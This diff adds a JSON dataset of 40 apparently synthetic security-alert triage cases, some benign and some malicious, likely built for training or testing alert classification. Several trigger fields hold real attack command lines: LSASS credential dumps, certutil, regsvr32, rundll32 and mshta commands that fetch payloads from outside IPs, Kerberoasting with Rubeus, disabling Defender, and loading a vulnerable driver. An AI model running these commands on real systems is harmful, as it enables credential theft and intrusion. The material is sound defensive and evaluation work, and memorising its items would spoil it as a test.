@@ -1,0 +1,1222 @@
+[
+  {
+    "case_id": "VIRGIL-001",
+    "alert": {
+      "rule": "Suspicious PowerShell Execution",
+      "severity": "medium",
+      "risk_score": 47
+    },
+    "host": {
+      "name": "ADMIN-01",
+      "role": "it_admin_workstation",
+      "criticality": "medium"
+    },
+    "user": {
+      "name": "svc_inventory",
+      "role": "IT Automation",
+      "is_admin": true
+    },
+    "trigger": {
+      "process": "powershell.exe",
+      "parent": "taskeng.exe",
+      "command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\ProgramData\\Corp\\inventory.ps1"
+    },
+    "enrichment": {
+      "command_seen_before": true,
+      "execution_count_30d": 842,
+      "approved_change": true,
+      "script_hash_known": true
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-002",
+    "alert": {
+      "rule": "Potential Credential Dumping via LSASS",
+      "severity": "high",
+      "risk_score": 73
+    },
+    "host": {
+      "name": "WORKSTATION-17",
+      "role": "finance_workstation",
+      "criticality": "medium"
+    },
+    "user": {
+      "name": "bob",
+      "role": "Finance User",
+      "is_admin": false
+    },
+    "trigger": {
+      "process": "rundll32.exe",
+      "parent": "cmd.exe",
+      "command_line": "rundll32.exe comsvcs.dll, MiniDump 672 C:\\Users\\Public\\lsass.dmp full"
+    },
+    "enrichment": {
+      "command_seen_before": false,
+      "user_seen_running_rundll32": false,
+      "similar_alerts_host_24h": 0,
+      "approved_change": false
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-003",
+    "alert": {
+      "rule": "Remote Service Creation",
+      "severity": "medium",
+      "risk_score": 55
+    },
+    "host": {
+      "name": "APP-04",
+      "role": "application_server",
+      "criticality": "high"
+    },
+    "user": {
+      "name": "deploysvc",
+      "role": "Deployment Service",
+      "is_admin": true
+    },
+    "trigger": {
+      "process": "services.exe",
+      "parent": "services.exe",
+      "command_line": "CorpDeployAgent.exe /install"
+    },
+    "enrichment": {
+      "approved_change": true,
+      "binary_signed": true,
+      "binary_seen_hosts_30d": 186,
+      "source_host": "SCCM-01"
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-004",
+    "alert": {
+      "rule": "Office Application Spawned PowerShell",
+      "severity": "high",
+      "risk_score": 82
+    },
+    "host": {
+      "name": "HR-LT-22",
+      "role": "hr_workstation",
+      "criticality": "medium"
+    },
+    "user": {
+      "name": "jane",
+      "role": "HR Analyst",
+      "is_admin": false
+    },
+    "trigger": {
+      "process": "powershell.exe",
+      "parent": "WINWORD.EXE",
+      "command_line": "powershell.exe -NoP -W Hidden -enc SQBFAFgA..."
+    },
+    "network": {
+      "destination": "185.10.10.5:443",
+      "destination_internal": false,
+      "destination_seen_before": false
+    },
+    "enrichment": {
+      "document_from_external_email": true,
+      "command_seen_before": false,
+      "approved_change": false
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-005",
+    "alert": {
+      "rule": "Unusual RDP Login",
+      "severity": "medium",
+      "risk_score": 48
+    },
+    "host": {
+      "name": "JUMP-01",
+      "role": "admin_jump_host",
+      "criticality": "high"
+    },
+    "user": {
+      "name": "alice.admin",
+      "role": "Systems Administrator",
+      "is_admin": true
+    },
+    "trigger": {
+      "event": "successful_rdp_logon",
+      "source": "10.20.5.17",
+      "destination": "JUMP-01"
+    },
+    "enrichment": {
+      "source_is_corporate_vpn": true,
+      "source_seen_for_user_before": true,
+      "login_hour_unusual": true,
+      "mfa_success": true
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-006",
+    "alert": {
+      "rule": "Certutil Download",
+      "severity": "high",
+      "risk_score": 76
+    },
+    "host": {
+      "name": "ENG-WS-08",
+      "role": "engineering_workstation",
+      "criticality": "medium"
+    },
+    "user": {
+      "name": "mark",
+      "role": "Engineer",
+      "is_admin": false
+    },
+    "trigger": {
+      "process": "certutil.exe",
+      "parent": "cmd.exe",
+      "command_line": "certutil.exe -urlcache -split -f http://203.0.113.55/update.exe C:\\Users\\Public\\update.exe"
+    },
+    "network": {
+      "destination": "203.0.113.55:80",
+      "destination_internal": false,
+      "destination_seen_before": false
+    },
+    "enrichment": {
+      "command_seen_before": false,
+      "downloaded_file_signed": false,
+      "approved_change": false
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-007",
+    "alert": {
+      "rule": "Administrative Share Access",
+      "severity": "low",
+      "risk_score": 28
+    },
+    "host": {
+      "name": "FILE-03",
+      "role": "file_server",
+      "criticality": "medium"
+    },
+    "user": {
+      "name": "helpdesk01",
+      "role": "Help Desk Administrator",
+      "is_admin": true
+    },
+    "trigger": {
+      "event": "smb_admin_share_access",
+      "source": "HELPDESK-02",
+      "share": "\\\\FILE-03\\C$"
+    },
+    "enrichment": {
+      "source_seen_before": true,
+      "user_access_count_30d": 91,
+      "ticket_match": true,
+      "approved_change": true
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-008",
+    "alert": {
+      "rule": "Possible DNS Tunneling",
+      "severity": "high",
+      "risk_score": 78
+    },
+    "host": {
+      "name": "DEV-14",
+      "role": "developer_workstation",
+      "criticality": "medium"
+    },
+    "user": {
+      "name": "sam",
+      "role": "Developer",
+      "is_admin": false
+    },
+    "trigger": {
+      "event": "high_entropy_dns_queries",
+      "domain": "data-sync-example.net",
+      "query_count_10m": 1487
+    },
+    "enrichment": {
+      "domain_seen_before": false,
+      "domain_age_days": 3,
+      "average_subdomain_length": 51,
+      "approved_application": false
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-009",
+    "alert": {
+      "rule": "PowerShell ExecutionPolicy Bypass",
+      "severity": "medium",
+      "risk_score": 51
+    },
+    "host": {
+      "name": "WIN10-CLIENT",
+      "role": "user_workstation",
+      "criticality": "low"
+    },
+    "user": {
+      "name": "bob",
+      "role": "Finance User",
+      "is_admin": false
+    },
+    "trigger": {
+      "process": "powershell.exe",
+      "parent": "explorer.exe",
+      "command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\bob\\Downloads\\inventory.ps1"
+    },
+    "network": {
+      "destination": "10.0.0.20:443",
+      "destination_internal": true
+    },
+    "enrichment": {
+      "script_seen_before": false,
+      "similar_command_seen_for_user": false,
+      "approved_change": false
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-010",
+    "alert": {
+      "rule": "Potential Kerberoasting Activity",
+      "severity": "high",
+      "risk_score": 81
+    },
+    "host": {
+      "name": "WORKSTATION-04",
+      "role": "sales_workstation",
+      "criticality": "low"
+    },
+    "user": {
+      "name": "john",
+      "role": "Sales User",
+      "is_admin": false
+    },
+    "trigger": {
+      "process": "Rubeus.exe",
+      "parent": "powershell.exe",
+      "command_line": "Rubeus.exe kerberoast /nowrap"
+    },
+    "enrichment": {
+      "binary_seen_before": false,
+      "binary_signed": false,
+      "service_ticket_requests_5m": 37,
+      "approved_security_test": false
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-011",
+    "alert": {
+      "rule": "PsExec Remote Execution",
+      "severity": "medium",
+      "risk_score": 58
+    },
+    "host": {
+      "name": "DB-02",
+      "role": "database_server",
+      "criticality": "high"
+    },
+    "user": {
+      "name": "sqladmin",
+      "role": "Database Administrator",
+      "is_admin": true
+    },
+    "trigger": {
+      "process": "PSEXESVC.exe",
+      "parent": "services.exe",
+      "source_host": "DBA-JUMP-01"
+    },
+    "enrichment": {
+      "source_host_is_admin_jumpbox": true,
+      "user_seen_using_psexec": true,
+      "execution_count_30d": 26,
+      "approved_change": true
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-012",
+    "alert": {
+      "rule": "Potential AS-REP Roasting",
+      "severity": "high",
+      "risk_score": 79
+    },
+    "host": {
+      "name": "USER-PC-33",
+      "role": "user_workstation",
+      "criticality": "low"
+    },
+    "user": {
+      "name": "kevin",
+      "role": "Marketing User",
+      "is_admin": false
+    },
+    "trigger": {
+      "process": "Rubeus.exe",
+      "parent": "cmd.exe",
+      "command_line": "Rubeus.exe asreproast /format:hashcat"
+    },
+    "enrichment": {
+      "binary_seen_before": false,
+      "binary_signed": false,
+      "approved_security_test": false,
+      "command_seen_before": false
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-013",
+    "alert": {
+      "rule": "Suspicious Scheduled Task Creation",
+      "severity": "medium",
+      "risk_score": 57
+    },
+    "host": {
+      "name": "WEB-05",
+      "role": "web_server",
+      "criticality": "high"
+    },
+    "user": {
+      "name": "webadmin",
+      "role": "Web Administrator",
+      "is_admin": true
+    },
+    "trigger": {
+      "process": "schtasks.exe",
+      "parent": "powershell.exe",
+      "command_line": "schtasks /create /tn CorpHealthCheck /tr C:\\Corp\\healthcheck.ps1 /sc hourly"
+    },
+    "enrichment": {
+      "task_name_seen_before": true,
+      "script_hash_known": true,
+      "approved_change": true,
+      "user_seen_creating_tasks": true
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-014",
+    "alert": {
+      "rule": "Suspicious Scheduled Task Creation",
+      "severity": "high",
+      "risk_score": 74
+    },
+    "host": {
+      "name": "FINANCE-09",
+      "role": "finance_workstation",
+      "criticality": "medium"
+    },
+    "user": {
+      "name": "amy",
+      "role": "Finance Analyst",
+      "is_admin": false
+    },
+    "trigger": {
+      "process": "schtasks.exe",
+      "parent": "cmd.exe",
+      "command_line": "schtasks /create /tn WindowsUpdateCheck /tr C:\\Users\\Public\\update.exe /sc minute /mo 15"
+    },
+    "enrichment": {
+      "task_name_seen_before": false,
+      "binary_signed": false,
+      "binary_seen_before": false,
+      "approved_change": false
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-015",
+    "alert": {
+      "rule": "Suspicious Rundll32 Execution",
+      "severity": "medium",
+      "risk_score": 52
+    },
+    "host": {
+      "name": "ENG-12",
+      "role": "engineering_workstation",
+      "criticality": "medium"
+    },
+    "user": {
+      "name": "laura",
+      "role": "Engineer",
+      "is_admin": false
+    },
+    "trigger": {
+      "process": "rundll32.exe",
+      "parent": "msiexec.exe",
+      "command_line": "rundll32.exe C:\\Program Files\\VendorApp\\setup.dll,Install"
+    },
+    "enrichment": {
+      "dll_signed": true,
+      "vendor_known": true,
+      "installer_hash_known": true,
+      "approved_software_install": true
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-016",
+    "alert": {
+      "rule": "Suspicious Rundll32 Remote Script Execution",
+      "severity": "critical",
+      "risk_score": 91
+    },
+    "host": {
+      "name": "LEGAL-04",
+      "role": "legal_workstation",
+      "criticality": "medium"
+    },
+    "user": {
+      "name": "david",
+      "role": "Legal User",
+      "is_admin": false
+    },
+    "trigger": {
+      "process": "rundll32.exe",
+      "parent": "explorer.exe",
+      "command_line": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";GetObject(\"script:http://203.0.113.44/payload.sct\")"
+    },
+    "enrichment": {
+      "command_seen_before": false,
+      "destination_seen_before": false,
+      "approved_change": false
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-017",
+    "alert": {
+      "rule": "Multiple Failed Logons Followed by Success",
+      "severity": "medium",
+      "risk_score": 54
+    },
+    "host": {
+      "name": "VPN-GW",
+      "role": "vpn_gateway",
+      "criticality": "high"
+    },
+    "user": {
+      "name": "maria",
+      "role": "Analyst",
+      "is_admin": false
+    },
+    "trigger": {
+      "event": "12_failed_logons_then_success",
+      "source_ip": "198.51.100.17"
+    },
+    "enrichment": {
+      "source_country_usual": true,
+      "device_seen_before": true,
+      "mfa_success": true,
+      "password_reset_24h": true
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-018",
+    "alert": {
+      "rule": "Multiple Failed Logons Followed by Success",
+      "severity": "high",
+      "risk_score": 78
+    },
+    "host": {
+      "name": "VPN-GW",
+      "role": "vpn_gateway",
+      "criticality": "high"
+    },
+    "user": {
+      "name": "maria",
+      "role": "Analyst",
+      "is_admin": false
+    },
+    "trigger": {
+      "event": "42_failed_logons_then_success",
+      "source_ip": "203.0.113.219"
+    },
+    "enrichment": {
+      "source_country_usual": false,
+      "device_seen_before": false,
+      "mfa_success": false,
+      "user_reported_activity": false
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-019",
+    "alert": {
+      "rule": "Windows Defender Configuration Modified",
+      "severity": "critical",
+      "risk_score": 89
+    },
+    "host": {
+      "name": "ACCT-11",
+      "role": "accounting_workstation",
+      "criticality": "medium"
+    },
+    "user": {
+      "name": "chris",
+      "role": "Accountant",
+      "is_admin": false
+    },
+    "trigger": {
+      "process": "powershell.exe",
+      "parent": "cmd.exe",
+      "command_line": "Set-MpPreference -DisableRealtimeMonitoring $true"
+    },
+    "enrichment": {
+      "command_seen_before": false,
+      "approved_change": false,
+      "security_tool_maintenance": false
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-020",
+    "alert": {
+      "rule": "Windows Defender Configuration Modified",
+      "severity": "medium",
+      "risk_score": 50
+    },
+    "host": {
+      "name": "LAB-AV-02",
+      "role": "security_test_workstation",
+      "criticality": "low"
+    },
+    "user": {
+      "name": "secops",
+      "role": "Security Engineer",
+      "is_admin": true
+    },
+    "trigger": {
+      "process": "powershell.exe",
+      "parent": "WindowsTerminal.exe",
+      "command_line": "Set-MpPreference -DisableRealtimeMonitoring $true"
+    },
+    "enrichment": {
+      "approved_security_test": true,
+      "ticket_match": true,
+      "maintenance_window_active": true,
+      "command_seen_before": true
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-021",
+    "alert": {
+      "rule": "New Domain Administrators Member",
+      "severity": "critical",
+      "risk_score": 94
+    },
+    "host": {
+      "name": "DC-01",
+      "role": "domain_controller",
+      "criticality": "critical"
+    },
+    "user": {
+      "name": "helpdesk02",
+      "role": "Help Desk",
+      "is_admin": false
+    },
+    "trigger": {
+      "event": "group_membership_change",
+      "group": "Domain Admins",
+      "added_account": "temp-support"
+    },
+    "enrichment": {
+      "approved_change": false,
+      "ticket_match": false,
+      "actor_permitted_to_modify_group": false,
+      "added_account_created_10m_ago": true
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-022",
+    "alert": {
+      "rule": "New Domain Administrators Member",
+      "severity": "high",
+      "risk_score": 72
+    },
+    "host": {
+      "name": "DC-01",
+      "role": "domain_controller",
+      "criticality": "critical"
+    },
+    "user": {
+      "name": "iam-admin",
+      "role": "Identity Administrator",
+      "is_admin": true
+    },
+    "trigger": {
+      "event": "group_membership_change",
+      "group": "Domain Admins",
+      "added_account": "new-domain-admin"
+    },
+    "enrichment": {
+      "approved_change": true,
+      "ticket_match": true,
+      "actor_permitted_to_modify_group": true,
+      "manager_approval_recorded": true
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-023",
+    "alert": {
+      "rule": "Possible WMI Lateral Movement",
+      "severity": "high",
+      "risk_score": 80
+    },
+    "host": {
+      "name": "DC-02",
+      "role": "domain_controller",
+      "criticality": "critical"
+    },
+    "user": {
+      "name": "bob",
+      "role": "Finance User",
+      "is_admin": false
+    },
+    "trigger": {
+      "process": "wmiprvse.exe",
+      "parent": "svchost.exe",
+      "command_line": "cmd.exe /c powershell.exe -enc SQBFAFgA...",
+      "source_host": "FINANCE-17"
+    },
+    "enrichment": {
+      "source_host_admin_tooling": false,
+      "user_seen_using_wmi": false,
+      "approved_change": false
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-024",
+    "alert": {
+      "rule": "Possible WMI Remote Administration",
+      "severity": "medium",
+      "risk_score": 49
+    },
+    "host": {
+      "name": "APP-22",
+      "role": "application_server",
+      "criticality": "high"
+    },
+    "user": {
+      "name": "opsadmin",
+      "role": "Operations Administrator",
+      "is_admin": true
+    },
+    "trigger": {
+      "process": "wmiprvse.exe",
+      "parent": "svchost.exe",
+      "command_line": "powershell.exe C:\\Corp\\CollectHealth.ps1",
+      "source_host": "OPS-JUMP-01"
+    },
+    "enrichment": {
+      "source_host_admin_tooling": true,
+      "user_seen_using_wmi": true,
+      "script_hash_known": true,
+      "approved_change": true
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-025",
+    "alert": {
+      "rule": "Registry Run Key Persistence",
+      "severity": "high",
+      "risk_score": 77
+    },
+    "host": {
+      "name": "EXEC-05",
+      "role": "executive_workstation",
+      "criticality": "high"
+    },
+    "user": {
+      "name": "ceo",
+      "role": "Executive",
+      "is_admin": false
+    },
+    "trigger": {
+      "process": "reg.exe",
+      "parent": "powershell.exe",
+      "command_line": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v UpdateService /d C:\\Users\\Public\\update.exe"
+    },
+    "enrichment": {
+      "binary_signed": false,
+      "binary_seen_before": false,
+      "approved_software_install": false
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-026",
+    "alert": {
+      "rule": "Registry Run Key Modification",
+      "severity": "low",
+      "risk_score": 31
+    },
+    "host": {
+      "name": "DESIGN-03",
+      "role": "designer_workstation",
+      "criticality": "low"
+    },
+    "user": {
+      "name": "emma",
+      "role": "Designer",
+      "is_admin": false
+    },
+    "trigger": {
+      "process": "VendorUpdater.exe",
+      "parent": "msiexec.exe",
+      "command_line": "VendorUpdater.exe /register-startup"
+    },
+    "enrichment": {
+      "binary_signed": true,
+      "vendor_known": true,
+      "approved_software_install": true,
+      "binary_prevalence_hosts": 612
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-027",
+    "alert": {
+      "rule": "Suspicious Regsvr32 Network Activity",
+      "severity": "critical",
+      "risk_score": 90
+    },
+    "host": {
+      "name": "SALES-19",
+      "role": "sales_workstation",
+      "criticality": "low"
+    },
+    "user": {
+      "name": "tom",
+      "role": "Sales User",
+      "is_admin": false
+    },
+    "trigger": {
+      "process": "regsvr32.exe",
+      "parent": "cmd.exe",
+      "command_line": "regsvr32.exe /s /n /u /i:http://198.51.100.88/payload.sct scrobj.dll"
+    },
+    "enrichment": {
+      "destination_seen_before": false,
+      "command_seen_before": false,
+      "approved_change": false
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-028",
+    "alert": {
+      "rule": "Large Outbound Data Transfer",
+      "severity": "high",
+      "risk_score": 75
+    },
+    "host": {
+      "name": "FINANCE-FS-01",
+      "role": "finance_file_server",
+      "criticality": "critical"
+    },
+    "user": {
+      "name": "backupsvc",
+      "role": "Backup Service",
+      "is_admin": true
+    },
+    "trigger": {
+      "event": "large_outbound_transfer",
+      "bytes": 32212254720,
+      "destination": "10.30.0.15"
+    },
+    "enrichment": {
+      "destination_role": "backup_repository",
+      "transfer_seen_daily": true,
+      "scheduled_backup_window": true,
+      "service_account_expected": true
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-029",
+    "alert": {
+      "rule": "Large Outbound Data Transfer",
+      "severity": "critical",
+      "risk_score": 93
+    },
+    "host": {
+      "name": "FINANCE-FS-01",
+      "role": "finance_file_server",
+      "criticality": "critical"
+    },
+    "user": {
+      "name": "bob",
+      "role": "Finance User",
+      "is_admin": false
+    },
+    "trigger": {
+      "event": "large_outbound_transfer",
+      "bytes": 21474836480,
+      "destination": "203.0.113.81:443"
+    },
+    "enrichment": {
+      "destination_internal": false,
+      "destination_seen_before": false,
+      "transfer_volume_user_baseline_mb": 84,
+      "approved_transfer": false
+    },
+    "correlated_activity": {
+      "archive_created_before_transfer": true,
+      "archive_process": "7z.exe",
+      "sensitive_files_accessed": true
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-030",
+    "alert": {
+      "rule": "Potential Process Dump",
+      "severity": "high",
+      "risk_score": 71
+    },
+    "host": {
+      "name": "IR-LAB-01",
+      "role": "security_lab",
+      "criticality": "low"
+    },
+    "user": {
+      "name": "incident.responder",
+      "role": "Incident Responder",
+      "is_admin": true
+    },
+    "trigger": {
+      "process": "procdump64.exe",
+      "parent": "cmd.exe",
+      "command_line": "procdump64.exe -ma lsass.exe C:\\Cases\\lsass.dmp"
+    },
+    "enrichment": {
+      "binary_signed": true,
+      "approved_incident_response": true,
+      "case_ticket_match": true,
+      "host_is_forensic_lab": true
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-031",
+    "alert": {
+      "rule": "Potential Process Dump",
+      "severity": "critical",
+      "risk_score": 88
+    },
+    "host": {
+      "name": "USER-44",
+      "role": "user_workstation",
+      "criticality": "medium"
+    },
+    "user": {
+      "name": "linda",
+      "role": "Customer Support",
+      "is_admin": false
+    },
+    "trigger": {
+      "process": "procdump64.exe",
+      "parent": "powershell.exe",
+      "command_line": "procdump64.exe -ma lsass.exe C:\\Users\\Public\\dump.dmp"
+    },
+    "enrichment": {
+      "binary_seen_before": false,
+      "user_seen_using_procdump": false,
+      "approved_incident_response": false,
+      "approved_change": false
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-032",
+    "alert": {
+      "rule": "Possible Command and Control Beaconing",
+      "severity": "high",
+      "risk_score": 84
+    },
+    "host": {
+      "name": "OPS-27",
+      "role": "operations_workstation",
+      "criticality": "medium"
+    },
+    "user": {
+      "name": "nick",
+      "role": "Operations User",
+      "is_admin": false
+    },
+    "trigger": {
+      "process": "update.exe",
+      "parent": "powershell.exe",
+      "destination": "198.51.100.200:443"
+    },
+    "enrichment": {
+      "binary_signed": false,
+      "binary_seen_before": false,
+      "destination_seen_before": false,
+      "connection_interval_seconds": 60,
+      "interval_jitter_low": true
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-033",
+    "alert": {
+      "rule": "Periodic Network Beaconing",
+      "severity": "medium",
+      "risk_score": 46
+    },
+    "host": {
+      "name": "CONF-ROOM-02",
+      "role": "conference_room_system",
+      "criticality": "low"
+    },
+    "user": {
+      "name": "SYSTEM",
+      "role": "System",
+      "is_admin": true
+    },
+    "trigger": {
+      "process": "TeamsRoomService.exe",
+      "destination": "52.112.0.20:443",
+      "connection_interval_seconds": 60
+    },
+    "enrichment": {
+      "binary_signed": true,
+      "vendor_known": true,
+      "destination_known_service": true,
+      "behavior_seen_30d": true
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-034",
+    "alert": {
+      "rule": "Possible Ransomware File Modification",
+      "severity": "critical",
+      "risk_score": 98
+    },
+    "host": {
+      "name": "FILE-01",
+      "role": "file_server",
+      "criticality": "critical"
+    },
+    "user": {
+      "name": "svc-files",
+      "role": "File Service",
+      "is_admin": true
+    },
+    "trigger": {
+      "process": "invoice_viewer.exe",
+      "parent": "explorer.exe",
+      "files_modified_5m": 14872
+    },
+    "enrichment": {
+      "binary_signed": false,
+      "binary_seen_before": false,
+      "new_file_extension": ".locked",
+      "shadow_copy_deletion_detected": true
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-035",
+    "alert": {
+      "rule": "Suspicious Driver Load",
+      "severity": "critical",
+      "risk_score": 92
+    },
+    "host": {
+      "name": "ENG-31",
+      "role": "engineering_workstation",
+      "criticality": "medium"
+    },
+    "user": {
+      "name": "rob",
+      "role": "Engineer",
+      "is_admin": true
+    },
+    "trigger": {
+      "process": "sc.exe",
+      "parent": "cmd.exe",
+      "command_line": "sc.exe create dbutil type= kernel binPath= C:\\Users\\Public\\dbutil_2_3.sys"
+    },
+    "enrichment": {
+      "driver_known_vulnerable": true,
+      "driver_expected": false,
+      "approved_change": false,
+      "security_product_stopped_after_load": true
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-036",
+    "alert": {
+      "rule": "Encoded PowerShell Execution",
+      "severity": "medium",
+      "risk_score": 58
+    },
+    "host": {
+      "name": "AUTOMATION-01",
+      "role": "automation_server",
+      "criticality": "medium"
+    },
+    "user": {
+      "name": "svc-deploy",
+      "role": "Deployment Service",
+      "is_admin": true
+    },
+    "trigger": {
+      "process": "powershell.exe",
+      "parent": "jenkins.exe",
+      "command_line": "powershell.exe -EncodedCommand JABQAHIAbwBkAHUAYwB0..."
+    },
+    "enrichment": {
+      "command_hash_seen_before": true,
+      "execution_count_30d": 3921,
+      "approved_pipeline": true,
+      "source_repository_known": true
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-037",
+    "alert": {
+      "rule": "Suspicious Mshta Execution",
+      "severity": "critical",
+      "risk_score": 87
+    },
+    "host": {
+      "name": "HR-18",
+      "role": "hr_workstation",
+      "criticality": "medium"
+    },
+    "user": {
+      "name": "susan",
+      "role": "HR User",
+      "is_admin": false
+    },
+    "trigger": {
+      "process": "mshta.exe",
+      "parent": "OUTLOOK.EXE",
+      "command_line": "mshta.exe https://203.0.113.70/update.hta"
+    },
+    "enrichment": {
+      "destination_seen_before": false,
+      "parent_child_seen_before": false,
+      "approved_change": false,
+      "email_from_external_sender": true
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-038",
+    "alert": {
+      "rule": "Excessive Kerberos Service Ticket Requests",
+      "severity": "medium",
+      "risk_score": 56
+    },
+    "host": {
+      "name": "BUILD-01",
+      "role": "build_server",
+      "criticality": "high"
+    },
+    "user": {
+      "name": "svc-build",
+      "role": "Build Service",
+      "is_admin": false
+    },
+    "trigger": {
+      "event": "kerberos_tgs_burst",
+      "service_ticket_requests_5m": 114
+    },
+    "enrichment": {
+      "behavior_seen_daily": true,
+      "requested_services_known": true,
+      "service_account_expected": true,
+      "new_spns_requested": false
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-039",
+    "alert": {
+      "rule": "Suspicious SMB Lateral Movement",
+      "severity": "critical",
+      "risk_score": 91
+    },
+    "host": {
+      "name": "DC-01",
+      "role": "domain_controller",
+      "criticality": "critical"
+    },
+    "user": {
+      "name": "bob",
+      "role": "Finance User",
+      "is_admin": false
+    },
+    "trigger": {
+      "event": "remote_service_execution",
+      "source_host": "FINANCE-17",
+      "destination": "DC-01",
+      "share": "ADMIN$"
+    },
+    "enrichment": {
+      "source_seen_administering_dc": false,
+      "user_expected_on_dc": false,
+      "approved_change": false
+    },
+    "correlated_activity": {
+      "credential_dump_alert_15m": true,
+      "new_remote_logon": true,
+      "powershell_execution_on_destination": true
+    }
+  },
+
+  {
+    "case_id": "VIRGIL-040",
+    "alert": {
+      "rule": "Possible Account Takeover",
+      "severity": "critical",
+      "risk_score": 95
+    },
+    "host": {
+      "name": "IDENTITY",
+      "role": "identity_platform",
+      "criticality": "critical"
+    },
+    "user": {
+      "name": "cfo",
+      "role": "Chief Financial Officer",
+      "is_admin": false
+    },
+    "trigger": {
+      "event": "successful_login_after_mfa_push_burst",
+      "mfa_pushes_10m": 14
+    },
+    "enrichment": {
+      "new_device": true,
+      "new_country": true,
+      "impossible_travel": true,
+      "user_reported_login": false,
+      "previous_mfa_denials": 13
+    },
+    "correlated_activity": {
+      "mailbox_rule_created": true,
+      "oauth_app_authorized": true,
+      "sensitive_files_accessed": true
+    }
+  }
+]
